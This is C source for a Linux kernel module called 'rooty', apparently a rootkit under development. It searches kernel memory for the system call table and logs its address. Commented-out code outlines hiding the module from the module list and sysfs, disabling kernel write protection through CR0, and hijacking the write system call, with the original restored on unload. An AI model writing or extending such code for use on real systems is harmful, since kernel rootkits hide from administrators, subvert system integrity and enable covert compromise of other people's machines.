#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/string.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");

int rooty_init(void);
void rooty_exit(void);
module_init(rooty_init);
module_exit(rooty_exit);

#if defined(__i386__)
#define START_CHECK 0xc0000000
#define END_CHECK 0xd0000000
typedef unsigned int psize;
#else
#define START_CHECK 0xffffffff81000000
#define END_CHECK 0xffffffffa2000000
typedef unsigned long psize;
#endif

psize *sys_call_table;
psize **find(void) {
 psize **sctable;
 psize i = START_CHECK;
 while (i < END_CHECK) {
  sctable = (psize **) i;
  if (sctable[__NR_close] == (psize *) sys_close) {
   return &sctable[0];
  }
  i += sizeof(void *);
 }
 return NULL;
}


int rooty_init(void) {
 /* Do kernel module hiding*/
 //list_del_init(&__this_module.list);
 //kobject_del(&THIS_MODULE->mkobj.kobj);
 
 /* Find the sys_call_table address in kernel memory */
 if ((sys_call_table = (psize *) find())) {
  printk("rooty: sys_call_table found at %p\n", sys_call_table);
 } else {
  printk("rooty: sys_call_table not found, aborting\n");
 }
 
 /* disable write protect on page in cr0 */
 //write_cr0(read_cr0() & (~ 0x10000));
 
 /* hijack functions */
 //o_write = (void *) xchg(&sys_call_table[__NR_write],rooty_write);
 
 /* return sys_call_table to WP */
 //write_cr0(read_cr0() | 0x10000);

 return 0;
}

void rooty_exit(void) {
 //write_cr0(read_cr0() & (~ 0x10000));
 //xchg(&sys_call_table[__NR_write],o_write);
 //write_cr0(read_cr0() | 0x10000);
 printk("rooty: Module unloaded\n");
}
